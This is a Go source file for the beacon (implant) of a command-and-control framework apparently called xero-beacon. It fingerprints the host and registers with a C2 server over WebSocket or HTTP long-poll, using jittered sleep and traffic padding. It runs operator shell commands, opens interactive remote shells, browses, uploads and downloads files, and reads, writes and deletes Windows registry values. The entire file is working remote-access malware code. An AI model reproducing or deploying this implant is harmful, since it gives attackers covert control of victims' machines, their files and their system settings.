package beacon

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"xero-beacon/internal/config"
	"xero-beacon/internal/filebrowser"
	"xero-beacon/internal/protocolclient"
	"xero-beacon/internal/registryeditor"
	"xero-beacon/internal/session"
	"xero-beacon/internal/shell"
	"xero-beacon/internal/state"
)

const resultChunkBytes = 512 * 1024

type Agent struct {
	Config    config.Config
	State     state.RuntimeState
	Client    *protocolclient.Client
	HTTP      *http.Client
	Files     *filebrowser.Manager
	Registry  *registryeditor.Manager
	Shells    *session.Manager
	Profile   trafficRuntimeProfile
	profileMu sync.RWMutex
}

func New(cfg config.Config) (*Agent, error) {
	protocol, err := protocolclient.New(cfg.C2PublicKeyB64)
	if err != nil {
		return nil, err
	}
	runtimeState, err := state.Load(cfg.StatePath)
	if err != nil {
		return nil, err
	}
	return &Agent{
		Config:   cfg,
		State:    runtimeState,
		Client:   protocol,
		HTTP:     &http.Client{Timeout: 45 * time.Second},
		Files:    filebrowser.NewManager(),
		Registry: registryeditor.NewManager(),
		Shells:   session.NewManager(),
		Profile:  defaultRuntimeProfile(cfg),
	}, nil
}

func runtimePayload(cfg config.Config) map[string]any {
	return map[string]any{
		"machine_fingerprint_hash": cfg.MachineFingerprintHash,
		"hostname":                 cfg.Hostname,
		"os":                       cfg.OS,
		"architecture":             cfg.Architecture,
		"internal_ip":              cfg.InternalIP,
		"external_ip":              emptyToNil(cfg.ExternalIP),
		"pid":                      cfg.PID,
	}
}

func (a *Agent) cfg() config.Config {
	return a.Config
}

func (a *Agent) Run(ctx context.Context) error {
	cfg := a.cfg()
	for {
		if err := a.RunOnce(ctx); err != nil && cfg.Transport != "websocket" {
			return err
		}
		if cfg.Once {
			return nil
		}
		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-time.After(SleepDuration(a.currentProfile().SleepSeconds, a.currentProfile().Jitter)):
		}
	}
}

func (a *Agent) RunOnce(ctx context.Context) error {
	cfg := a.cfg()
	if cfg.Transport != "long-poll" {
		if err := a.runWebSocketCycle(ctx); err == nil || !cfg.FallbackLongPollEnabled {
			return err
		}
	}
	if a.State.BeaconID == "" && cfg.ColdStartRestFallback {
		if err := a.restRegister(ctx); err != nil {
			return err
		}
	}
	if a.State.BeaconID == "" {
		return errors.New("long-poll fallback requires a saved beacon identity")
	}
	return a.runLongPollCycle(ctx)
}

func (a *Agent) runWebSocketCycle(ctx context.Context) error {
	cfg := a.cfg()
	dialer := websocket.Dialer{Subprotocols: []string{"xero.beacon.v1"}}
	headers := http.Header{}
	wsURL, err := a.websocketProfileURL()
	if err != nil {
		return err
	}
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, wsURL, nil)
	if err != nil {
		return err
	}
	a.applyProfileHeaders(request)
	headers = request.Header
	if a.State.BeaconToken != "" {
		headers.Set("Authorization", "Bearer "+a.State.BeaconToken)
	}
	conn, _, err := dialer.DialContext(ctx, wsURL, headers)
	if err != nil {
		return err
	}
	defer conn.Close()
	if a.State.BeaconID == "" {
		ack, err := a.sendAndReceive(conn, "REGISTER", registerPayload(runtimePayload(a.Config)))
		if err != nil {
			return err
		}
		if err := a.applyRegisterACK(ack); err != nil {
			return err
		}
	}
	if _, err := a.sendAndReceive(conn, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
		return err
	}
	ack, err := a.sendAndReceive(conn, "TASK_POLL", map[string]any{"beacon_id": a.State.BeaconID})
	if err != nil {
		return err
	}
	if err := a.executeTaskFromACK(ctx, ack, func(payload map[string]any) error {
		_, err := a.sendAndReceive(conn, "TASK_RESULT", payload)
		return err
	}); err != nil {
		return err
	}
	if cfg.Once {
		return nil
	}
	return a.runWebSocketReadLoop(ctx, conn)
}

func (a *Agent) sendAndReceive(conn *websocket.Conn, messageType string, payload map[string]any) (map[string]any, error) {
	frame, err := a.Client.Encode(messageType, a.payloadWithPadding(messageType, payload))
	if err != nil {
		return nil, err
	}
	if err := conn.WriteMessage(websocket.BinaryMessage, frame); err != nil {
		return nil, err
	}
	kind, response, err := conn.ReadMessage()
	if err != nil {
		return nil, err
	}
	if kind != websocket.BinaryMessage {
		return nil, errors.New("expected binary protocol frame")
	}
	decoded, err := a.Client.Decode(response)
	if err != nil {
		return nil, err
	}
	a.applyProfileACK(decoded.Payload)
	return decoded.Payload, nil
}

type lockedWebSocketWriter struct {
	conn *websocket.Conn
	mu   sync.Mutex
}

type websocketRead struct {
	kind int
	raw  []byte
	err  error
}

func (a *Agent) runWebSocketReadLoop(ctx context.Context, conn *websocket.Conn) error {
	writer := &lockedWebSocketWriter{conn: conn}
	readCh := make(chan websocketRead, 1)
	go func() {
		for {
			kind, raw, err := conn.ReadMessage()
			readCh <- websocketRead{kind: kind, raw: raw, err: err}
			if err != nil {
				return
			}
		}
	}()

	interval := SleepDuration(a.cfg().SleepSeconds, a.cfg().Jitter)
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			a.Files.CloseAll()
			a.Shells.CloseAll("context_cancelled")
			return ctx.Err()
		case read := <-readCh:
			if read.err != nil {
				a.Files.CloseAll()
				a.Shells.CloseAll("transport_closed")
				return nil
			}
			if read.kind != websocket.BinaryMessage {
				return errors.New("expected binary protocol frame")
			}
			decoded, err := a.Client.Decode(read.raw)
			if err != nil {
				return err
			}
			if err := a.handleWebSocketFrame(ctx, decoded.MessageType, decoded.Payload, writer); err != nil {
				return err
			}
			ticker.Reset(SleepDuration(a.currentProfile().SleepSeconds, a.currentProfile().Jitter))
		case <-ticker.C:
			if err := a.writeWebSocketFrame(writer, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
				return err
			}
			if err := a.writeWebSocketFrame(writer, "TASK_POLL", map[string]any{"beacon_id": a.State.BeaconID}); err != nil {
				return err
			}
		}
	}
}

func (a *Agent) writeWebSocketFrame(writer *lockedWebSocketWriter, messageType string, payload map[string]any) error {
	frame, err := a.Client.Encode(messageType, a.payloadWithPadding(messageType, payload))
	if err != nil {
		return err
	}
	writer.mu.Lock()
	defer writer.mu.Unlock()
	return writer.conn.WriteMessage(websocket.BinaryMessage, frame)
}

func (a *Agent) handleWebSocketFrame(ctx context.Context, messageType string, payload map[string]any, writer *lockedWebSocketWriter) error {
	switch messageType {
	case "ACK":
		a.applyProfileACK(payload)
		return a.executeTaskFromACK(ctx, payload, func(result map[string]any) error {
			return a.writeWebSocketFrame(writer, "TASK_RESULT", result)
		})
	case "SESSION_DATA":
		return a.handleSessionData(ctx, payload, func(response map[string]any) error {
			return a.writeWebSocketFrame(writer, "SESSION_DATA", response)
		})
	case "PROTOCOL_ERROR":
		return fmt.Errorf("c2 protocol error: %v", payload["message"])
	default:
		return nil
	}
}

func (a *Agent) handleSessionData(ctx context.Context, payload map[string]any, send func(map[string]any) error) error {
	sessionID := stringValue(payload["session_id"])
	op := stringValue(payload["op"])
	sessionType := stringValue(payload["session_type"])
	if sessionID == "" {
		return errors.New("SESSION_DATA missing session_id")
	}
	if op == "" {
		return a.sendSessionData(sessionID, "error", map[string]any{"reason": "SESSION_DATA missing op"}, send)
	}

	switch op {
	case "open":
		if sessionType == "file_browser" {
			rootPath, err := a.Files.Open(sessionID, stringValue(payload["root_path"]))
			if err != nil {
				return a.sendSessionData(sessionID, "error", map[string]any{
					"error_code":   filebrowser.ErrorCode(err),
					"message":      err.Error(),
					"session_type": "file_browser",
				}, send)
			}
			return a.sendSessionData(sessionID, "open_ack", map[string]any{
				"root_path":    rootPath,
				"session_type": "file_browser",
			}, send)
		}
		if sessionType == "registry" {
			if err := a.Registry.Open(sessionID); err != nil {
				return a.sendSessionData(sessionID, "error", map[string]any{
					"error_code":   registryeditor.ErrorCode(err),
					"message":      err.Error(),
					"session_type": "registry",
				}, send)
			}
			return a.sendSessionData(sessionID, "open_ack", map[string]any{"session_type": "registry"}, send)
		}
		shellType := stringValue(payload["shell_type"])
		if shellType == "" {
			shellType = "auto"
		}
		rows := numericInt(payload["rows"], 24)
		cols := numericInt(payload["cols"], 80)
		err := a.Shells.Open(ctx, sessionID, session.Options{ShellType: shellType, Rows: rows, Cols: cols}, func(event session.Event) {
			_ = a.sendSessionEvent(sessionID, event, send)
		})
		if err != nil {
			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
		}
		return a.sendSessionData(sessionID, "open_ack", map[string]any{"shell_type": shellType, "rows": rows, "cols": cols, "session_type": "shell"}, send)
	case "list_dir":
		return a.sendFileList(sessionID, payload, send)
	case "stat":
		return a.sendFileStat(sessionID, payload, send)
	case "read_file":
		return a.sendFileRead(sessionID, payload, send)
	case "upload_init":
		return a.sendFileUploadReady(sessionID, payload, send)
	case "upload_chunk":
		return a.sendFileUploadAck(sessionID, payload, send)
	case "upload_complete":
		return a.sendFileUploadComplete(sessionID, payload, send)
	case "download_init":
		return a.sendFileDownloadReady(sessionID, payload, send)
	case "download_chunk_request":
		return a.sendFileDownloadChunk(sessionID, payload, send)
	case "reg_list_key":
		return a.sendRegistryList(sessionID, payload, send)
	case "reg_read_value":
		return a.sendRegistryRead(sessionID, payload, send)
	case "reg_write_value":
		return a.sendRegistryWrite(sessionID, payload, send)
	case "reg_delete_value":
		return a.sendRegistryDelete(sessionID, payload, send)
	case "stdin":
		data, err := terminalData(payload)
		if err != nil {
			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
		}
		if err := a.Shells.Write(sessionID, data); err != nil {
			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
		}
	case "resize":
		rows := numericInt(payload["rows"], 24)
		cols := numericInt(payload["cols"], 80)
		if err := a.Shells.Resize(sessionID, rows, cols); err != nil {
			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
		}
	case "close":
		reason := stringValue(payload["reason"])
		if reason == "" {
			reason = "operator"
		}
		if sessionType == "file_browser" {
			if err := a.Files.Close(sessionID); err != nil && !errors.Is(err, filebrowser.ErrUnknownSession) {
				return a.sendSessionData(sessionID, "error", map[string]any{
					"error_code":   filebrowser.ErrorCode(err),
					"message":      err.Error(),
					"session_type": "file_browser",
				}, send)
			}
			return a.sendSessionData(sessionID, "close", map[string]any{"reason": reason, "session_type": "file_browser"}, send)
		}
		if sessionType == "registry" {
			if err := a.Registry.Close(sessionID); err != nil && !errors.Is(err, registryeditor.ErrUnknownSession) {
				return a.sendSessionData(sessionID, "error", map[string]any{
					"error_code":   registryeditor.ErrorCode(err),
					"message":      err.Error(),
					"session_type": "registry",
				}, send)
			}
			return a.sendSessionData(sessionID, "close", map[string]any{"reason": reason, "session_type": "registry"}, send)
		}
		if err := a.Shells.Close(sessionID, reason); err != nil && !errors.Is(err, session.ErrUnknownSession) {
			return a.sendSessionData(sessionID, "error", map[string]any{"reason": err.Error()}, send)
		}
		return a.sendSessionData(sessionID, "close", map[string]any{"reason": reason}, send)
	default:
		return a.sendSessionData(sessionID, "error", map[string]any{"reason": "unsupported SESSION_DATA op"}, send)
	}
	return nil
}

func (a *Agent) sendFileList(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	path := stringValue(payload["path"])
	entries, err := a.Files.ListDir(sessionID, path)
	if err != nil {
		return a.sendFileError(sessionID, "list_dir", requestID, path, err, send)
	}
	return a.sendSessionData(sessionID, "list_dir", map[string]any{
		"entries":      entries,
		"ok":           true,
		"path":         path,
		"request_id":   requestID,
		"session_type": "file_browser",
	}, send)
}

func (a *Agent) sendFileStat(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	path := stringValue(payload["path"])
	entry, err := a.Files.Stat(sessionID, path)
	if err != nil {
		return a.sendFileError(sessionID, "stat", requestID, path, err, send)
	}
	return a.sendSessionData(sessionID, "stat", map[string]any{
		"modified_at":  entry.ModifiedAt,
		"ok":           true,
		"path":         entry.Path,
		"permissions":  entry.Permissions,
		"request_id":   requestID,
		"session_type": "file_browser",
		"size":         entry.Size,
		"type":         entry.Type,
	}, send)
}

func (a *Agent) sendFileRead(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	path := stringValue(payload["path"])
	result, err := a.Files.ReadFile(sessionID, path, filebrowser.DefaultPreviewLimitBytes)
	if err != nil {
		return a.sendFileError(sessionID, "read_file", requestID, path, err, send)
	}
	return a.sendSessionData(sessionID, "read_file", map[string]any{
		"content":      result.Content,
		"encoding":     result.Encoding,
		"ok":           true,
		"path":         path,
		"request_id":   requestID,
		"session_type": "file_browser",
		"size":         result.Size,
		"truncated":    result.Truncated,
		"type":         "file",
	}, send)
}

func (a *Agent) sendFileUploadReady(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	transferID := stringValue(payload["transfer_id"])
	path := stringValue(payload["path"])
	status, err := a.Files.StartUpload(
		sessionID,
		transferID,
		path,
		int64(numericInt(payload["size_bytes"], 0)),
		stringValue(payload["sha256"]),
		int64(numericInt(payload["chunk_size_bytes"], int(filebrowser.DefaultTransferChunkBytes))),
		numericInt(payload["total_chunks"], 0),
		payloadBool(payload["overwrite"]),
	)
	if err != nil {
		return a.sendFileTransferError(sessionID, requestID, transferID, path, err, send)
	}
	return a.sendSessionData(sessionID, "upload_ready", map[string]any{
		"next_sequence":      status.NextSequence,
		"ok":                 true,
		"path":               path,
		"received_sequences": status.ReceivedSequences,
		"request_id":         requestID,
		"session_type":       "file_browser",
		"transfer_id":        transferID,
	}, send)
}

func (a *Agent) sendFileUploadAck(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	transferID := stringValue(payload["transfer_id"])
	path := stringValue(payload["path"])
	sequence := numericInt(payload["sequence"], -1)
	data, err := terminalData(payload)
	if err != nil {
		return a.sendFileTransferError(sessionID, requestID, transferID, path, err, send)
	}
	status, err := a.Files.WriteUploadChunk(sessionID, transferID, sequence, data, stringValue(payload["chunk_sha256"]))
	if err != nil {
		if errors.Is(err, filebrowser.ErrHashMismatch) {
			return a.sendSessionData(sessionID, "upload_nack", map[string]any{
				"error_code":   filebrowser.ErrorCode(err),
				"message":      err.Error(),
				"ok":           false,
				"path":         path,
				"request_id":   requestID,
				"sequence":     sequence,
				"session_type": "file_browser",
				"transfer_id":  transferID,
			}, send)
		}
		return a.sendFileTransferError(sessionID, requestID, transferID, path, err, send)
	}
	return a.sendSessionData(sessionID, "upload_ack", map[string]any{
		"next_sequence":      status.NextSequence,
		"ok":                 true,
		"path":               path,
		"received_sequences": status.ReceivedSequences,
		"request_id":         requestID,
		"sequence":           sequence,
		"session_type":       "file_browser",
		"transfer_id":        transferID,
	}, send)
}

func (a *Agent) sendFileUploadComplete(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	transferID := stringValue(payload["transfer_id"])
	path := stringValue(payload["path"])
	digest, err := a.Files.CompleteUpload(sessionID, transferID)
	if err != nil {
		return a.sendFileTransferError(sessionID, requestID, transferID, path, err, send)
	}
	return a.sendSessionData(sessionID, "upload_complete", map[string]any{
		"ok":           true,
		"path":         path,
		"request_id":   requestID,
		"session_type": "file_browser",
		"sha256":       digest,
		"transfer_id":  transferID,
	}, send)
}

func (a *Agent) sendFileDownloadReady(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	transferID := stringValue(payload["transfer_id"])
	path := stringValue(payload["path"])
	info, err := a.Files.StartDownload(
		sessionID,
		path,
		int64(numericInt(payload["chunk_size_bytes"], int(filebrowser.DefaultTransferChunkBytes))),
	)
	if err != nil {
		return a.sendFileTransferError(sessionID, requestID, transferID, path, err, send)
	}
	return a.sendSessionData(sessionID, "download_ready", map[string]any{
		"chunk_size_bytes": info.ChunkSizeBytes,
		"ok":               true,
		"path":             info.Path,
		"request_id":       requestID,
		"session_type":     "file_browser",
		"sha256":           info.SHA256,
		"size_bytes":       info.SizeBytes,
		"total_chunks":     info.TotalChunks,
		"transfer_id":      transferID,
	}, send)
}

func (a *Agent) sendFileDownloadChunk(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	transferID := stringValue(payload["transfer_id"])
	path := stringValue(payload["path"])
	sequence := numericInt(payload["sequence"], -1)
	data, digest, err := a.Files.ReadDownloadChunk(
		sessionID,
		path,
		sequence,
		int64(numericInt(payload["chunk_size_bytes"], int(filebrowser.DefaultTransferChunkBytes))),
	)
	if err != nil {
		return a.sendFileTransferError(sessionID, requestID, transferID, path, err, send)
	}
	return a.sendSessionData(sessionID, "download_chunk", map[string]any{
		"chunk_sha256": digest,
		"data_b64":     base64.StdEncoding.EncodeToString(data),
		"ok":           true,
		"path":         path,
		"request_id":   requestID,
		"sequence":     sequence,
		"session_type": "file_browser",
		"size_bytes":   len(data),
		"transfer_id":  transferID,
	}, send)
}

func (a *Agent) sendFileTransferError(
	sessionID string,
	requestID string,
	transferID string,
	path string,
	err error,
	send func(map[string]any) error,
) error {
	return a.sendSessionData(sessionID, "transfer_error", map[string]any{
		"error_code":   filebrowser.ErrorCode(err),
		"message":      err.Error(),
		"ok":           false,
		"path":         path,
		"request_id":   requestID,
		"session_type": "file_browser",
		"transfer_id":  transferID,
	}, send)
}

func (a *Agent) sendFileError(sessionID string, op string, requestID string, path string, err error, send func(map[string]any) error) error {
	return a.sendSessionData(sessionID, op, map[string]any{
		"error_code":   filebrowser.ErrorCode(err),
		"message":      err.Error(),
		"ok":           false,
		"path":         path,
		"request_id":   requestID,
		"session_type": "file_browser",
	}, send)
}

func (a *Agent) sendRegistryList(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	hive := stringValue(payload["hive"])
	keyPath := stringValue(payload["key_path"])
	listing, err := a.Registry.ListKey(sessionID, hive, keyPath)
	if err != nil {
		return a.sendRegistryError(sessionID, "reg_list_key", requestID, hive, keyPath, stringValue(payload["value_name"]), err, send)
	}
	return a.sendSessionData(sessionID, "reg_list_key", map[string]any{
		"hive":         listing.Hive,
		"key_path":     listing.KeyPath,
		"ok":           true,
		"request_id":   requestID,
		"session_type": "registry",
		"subkeys":      listing.Subkeys,
		"values":       listing.Values,
	}, send)
}

func (a *Agent) sendRegistryRead(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	hive := stringValue(payload["hive"])
	keyPath := stringValue(payload["key_path"])
	valueName := stringValue(payload["value_name"])
	value, err := a.Registry.ReadValue(sessionID, hive, keyPath, valueName)
	if err != nil {
		return a.sendRegistryError(sessionID, "reg_read_value", requestID, hive, keyPath, valueName, err, send)
	}
	return a.sendSessionData(sessionID, "reg_read_value", map[string]any{
		"hive":         hive,
		"key_path":     keyPath,
		"ok":           true,
		"request_id":   requestID,
		"session_type": "registry",
		"value":        value.Value,
		"value_name":   value.Name,
		"value_type":   value.Type,
		"writable":     value.Writable,
	}, send)
}

func (a *Agent) sendRegistryWrite(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	hive := stringValue(payload["hive"])
	keyPath := stringValue(payload["key_path"])
	valueName := stringValue(payload["value_name"])
	valueType := stringValue(payload["value_type"])
	value, err := a.Registry.WriteValue(sessionID, hive, keyPath, valueName, valueType, payload["value"])
	if err != nil {
		return a.sendRegistryError(sessionID, "reg_write_value", requestID, hive, keyPath, valueName, err, send)
	}
	return a.sendSessionData(sessionID, "reg_write_value", map[string]any{
		"hive":         hive,
		"key_path":     keyPath,
		"ok":           true,
		"request_id":   requestID,
		"session_type": "registry",
		"value":        value.Value,
		"value_name":   value.Name,
		"value_type":   value.Type,
		"writable":     value.Writable,
	}, send)
}

func (a *Agent) sendRegistryDelete(sessionID string, payload map[string]any, send func(map[string]any) error) error {
	requestID := stringValue(payload["request_id"])
	hive := stringValue(payload["hive"])
	keyPath := stringValue(payload["key_path"])
	valueName := stringValue(payload["value_name"])
	if err := a.Registry.DeleteValue(sessionID, hive, keyPath, valueName); err != nil {
		return a.sendRegistryError(sessionID, "reg_delete_value", requestID, hive, keyPath, valueName, err, send)
	}
	return a.sendSessionData(sessionID, "reg_delete_value", map[string]any{
		"hive":         hive,
		"key_path":     keyPath,
		"ok":           true,
		"request_id":   requestID,
		"session_type": "registry",
		"value_name":   valueName,
	}, send)
}

func (a *Agent) sendRegistryError(sessionID string, op string, requestID string, hive string, keyPath string, valueName string, err error, send func(map[string]any) error) error {
	return a.sendSessionData(sessionID, op, map[string]any{
		"error_code":   registryeditor.ErrorCode(err),
		"hive":         hive,
		"key_path":     keyPath,
		"message":      err.Error(),
		"ok":           false,
		"request_id":   requestID,
		"session_type": "registry",
		"value_name":   emptyToNil(valueName),
	}, send)
}

func (a *Agent) sendSessionEvent(sessionID string, event session.Event, send func(map[string]any) error) error {
	fields := map[string]any{}
	if len(event.Data) > 0 {
		fields["data_b64"] = base64.StdEncoding.EncodeToString(event.Data)
	}
	if event.Reason != "" {
		fields["reason"] = event.Reason
	}
	if event.Op == "exit" {
		fields["exit_code"] = event.ExitCode
	}
	return a.sendSessionData(sessionID, event.Op, fields, send)
}

func (a *Agent) sendSessionData(sessionID string, op string, fields map[string]any, send func(map[string]any) error) error {
	response := map[string]any{
		"beacon_id":  a.State.BeaconID,
		"session_id": sessionID,
		"op":         op,
	}
	for key, value := range fields {
		response[key] = value
	}
	return send(response)
}

func terminalData(payload map[string]any) ([]byte, error) {
	if dataB64 := stringValue(payload["data_b64"]); dataB64 != "" {
		return base64.StdEncoding.DecodeString(dataB64)
	}
	if data := stringValue(payload["data"]); data != "" {
		return []byte(data), nil
	}
	return nil, errors.New("terminal input requires data")
}

func (a *Agent) runLongPollCycle(ctx context.Context) error {
	if _, err := a.postFrame(ctx, "HEARTBEAT", heartbeatPayload(a.State.BeaconID, runtimePayload(a.Config))); err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodGet,
		a.c2ProfileURL("poll"),
		nil,
	)
	if err != nil {
		return err
	}
	a.applyProfileHeaders(req)
	req.Header.Set("Authorization", "Bearer "+a.State.BeaconToken)
	response, err := a.HTTP.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode == http.StatusNoContent {
		return nil
	}
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("long-poll returned %d", response.StatusCode)
	}
	raw, err := io.ReadAll(response.Body)
	if err != nil {
		return err
	}
	decoded, err := a.Client.Decode(raw)
	if err != nil {
		return err
	}
	a.applyProfileACK(decoded.Payload)
	return a.executeTaskFromACK(ctx, decoded.Payload, func(payload map[string]any) error {
		_, err := a.postFrame(ctx, "TASK_RESULT", payload)
		return err
	})
}

func (a *Agent) postFrame(ctx context.Context, messageType string, payload map[string]any) (map[string]any, error) {
	frame, err := a.Client.Encode(messageType, a.payloadWithPadding(messageType, payload))
	if err != nil {
		return nil, err
	}
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodPost,
		a.c2ProfileURL("frame"),
		bytes.NewReader(frame),
	)
	if err != nil {
		return nil, err
	}
	a.applyProfileHeaders(req)
	req.Header.Set("Authorization", "Bearer "+a.State.BeaconToken)
	req.Header.Set("Content-Type", "application/octet-stream")
	response, err := a.HTTP.Do(req)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return nil, fmt.Errorf("frame POST returned %d", response.StatusCode)
	}
	raw, err := io.ReadAll(response.Body)
	if err != nil {
		return nil, err
	}
	if len(raw) == 0 {
		return nil, nil
	}
	decoded, err := a.Client.Decode(raw)
	if err != nil {
		return nil, err
	}
	a.applyProfileACK(decoded.Payload)
	return decoded.Payload, nil
}

func (a *Agent) restRegister(ctx context.Context) error {
	content, err := json.Marshal(runtimePayload(a.Config))
	if err != nil {
		return err
	}
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodPost,
		a.c2ProfileURL("register"),
		bytes.NewReader(content),
	)
	if err != nil {
		return err
	}
	a.applyProfileHeaders(req)
	req.Header.Set("Content-Type", "application/json")
	response, err := a.HTTP.Do(req)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		return fmt.Errorf("REST register returned %d", response.StatusCode)
	}
	var payload map[string]any
	if err := json.NewDecoder(response.Body).Decode(&payload); err != nil {
		return err
	}
	beaconID, _ := payload["beacon_id"].(string)
	token, _ := payload["beacon_token"].(string)
	if beaconID == "" || token == "" {
		return errors.New("REST register response missing beacon identity")
	}
	a.State.BeaconID = beaconID
	a.State.BeaconToken = token
	a.applyProfileACK(payload)
	return state.Save(a.cfg().StatePath, a.State)
}

func (a *Agent) applyRegisterACK(payload map[string]any) error {
	beaconID, _ := payload["beacon_id"].(string)
	token, _ := payload["beacon_token"].(string)
	if beaconID == "" || token == "" {
		return errors.New("REGISTER ACK missing beacon identity")
	}
	a.State.BeaconID = beaconID
	a.State.BeaconToken = token
	a.applyProfileACK(payload)
	return state.Save(a.cfg().StatePath, a.State)
}

func (a *Agent) executeTaskFromACK(ctx context.Context, ack map[string]any, sendResult func(map[string]any) error) error {
	task, ok := ack["task"].(map[string]any)
	if !ok || task == nil {
		return nil
	}
	taskID, _ := task["id"].(string)
	module, _ := task["module"].(string)
	args, _ := task["args"].(map[string]any)
	if taskID == "" || module != "shell" {
		return nil
	}
	if err := sendResult(map[string]any{
		"beacon_id": a.State.BeaconID,
		"task_id":   taskID,
		"status":    "running",
	}); err != nil {
		return err
	}
	command, _ := args["command"].(string)
	shellType, _ := args["shell_type"].(string)
	timeoutSeconds := numericInt(args["timeout_seconds"], 60)
	done := make(chan shell.Result, 1)
	go func() {
		done <- shell.Run(command, shellType, timeoutSeconds, a.cfg().OutputLimitBytes)
	}()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case result := <-done:
		return a.sendTaskResult(taskID, result, sendResult)
	}
}

func (a *Agent) sendTaskResult(taskID string, result shell.Result, sendResult func(map[string]any) error) error {
	base := map[string]any{
		"beacon_id":  a.State.BeaconID,
		"task_id":    taskID,
		"status":     result.Status,
		"exit_code":  result.ExitCode,
		"timed_out":  result.TimedOut,
		"truncated":  result.Truncated,
		"session_id": a.Client.SessionIDString(),
	}
	if len([]byte(result.Stdout))+len([]byte(result.Stderr)) <= resultChunkBytes {
		base["stdout"] = result.Stdout
		base["stderr"] = result.Stderr
		return sendResult(base)
	}

	uploadID := fmt.Sprintf("%s-%s-%d", a.Client.SessionIDString(), taskID, time.Now().UnixNano())
	streams := []struct {
		name  string
		value string
	}{
		{name: "stdout", value: result.Stdout},
		{name: "stderr", value: result.Stderr},
	}
	chunkedStreams := make([]struct {
		name  string
		value string
	}, 0, len(streams))
	for _, stream := range streams {
		if stream.value != "" {
			chunkedStreams = append(chunkedStreams, stream)
		}
	}
	if len(chunkedStreams) == 0 {
		base["stdout"] = result.Stdout
		base["stderr"] = result.Stderr
		return sendResult(base)
	}

	for streamIndex, stream := range chunkedStreams {
		content := []byte(stream.value)
		totalChunks := (len(content) + resultChunkBytes - 1) / resultChunkBytes
		streamDigest := sha256Hex(content)
		for sequence := 0; sequence < totalChunks; sequence++ {
			start := sequence * resultChunkBytes
			end := start + resultChunkBytes
			if end > len(content) {
				end = len(content)
			}
			chunk := content[start:end]
			payload := cloneMap(base)
			payload["upload_id"] = uploadID
			payload["result_id"] = uploadID
			payload["stream"] = stream.name
			payload["chunk_index"] = sequence
			payload["total_chunks"] = totalChunks
			payload["chunk"] = string(chunk)
			payload["chunk_sha256"] = sha256Hex(chunk)
			payload["stream_sha256"] = streamDigest
			payload["stream_size_bytes"] = len(content)
			payload["result_final"] = streamIndex == len(chunkedStreams)-1 && sequence == totalChunks-1
			if payload["result_final"] == true {
				payload["stdout"] = fallbackStreamValue(result.Stdout, stream.name, "stdout")
				payload["stderr"] = fallbackStreamValue(result.Stderr, stream.name, "stderr")
			}
			if err := sendResult(payload); err != nil {
				return err
			}
		}
	}
	return nil
}

func cloneMap(value map[string]any) map[string]any {
	cloned := make(map[string]any, len(value))
	for key, item := range value {
		cloned[key] = item
	}
	return cloned
}

func fallbackStreamValue(value string, chunkedStream string, targetStream string) string {
	if chunkedStream == targetStream {
		return ""
	}
	if len([]byte(value)) > resultChunkBytes {
		return ""
	}
	return value
}

func sha256Hex(content []byte) string {
	digest := sha256.Sum256(content)
	return hex.EncodeToString(digest[:])
}

func registerPayload(runtime map[string]any) map[string]any {
	payload := heartbeatPayload("", runtime)
	payload["supported_versions"] = []int{1}
	delete(payload, "beacon_id")
	return payload
}

func heartbeatPayload(beaconID string, runtime map[string]any) map[string]any {
	payload := map[string]any{}
	for key, value := range runtime {
		if value != nil {
			payload[key] = value
		}
	}
	if beaconID != "" {
		payload["beacon_id"] = beaconID
	}
	return payload
}

func SleepDuration(seconds int, jitter float64) time.Duration {
	if seconds < 1 {
		seconds = 1
	}
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 1 {
		jitter = 1
	}
	base := float64(seconds)
	window := base * jitter
	offset := 0.0
	if window > 0 {
		offset = rand.Float64()*2*window - window
	}
	return time.Duration((base + offset) * float64(time.Second))
}

func numericInt(value any, fallback int) int {
	switch typed := value.(type) {
	case float64:
		return int(typed)
	case int:
		return typed
	default:
		return fallback
	}
}

func payloadBool(value any) bool {
	typed, _ := value.(bool)
	return typed
}

func stringValue(value any) string {
	typed, _ := value.(string)
	return strings.TrimSpace(typed)
}

func emptyToNil(value string) any {
	if strings.TrimSpace(value) == "" {
		return nil
	}
	return value
}
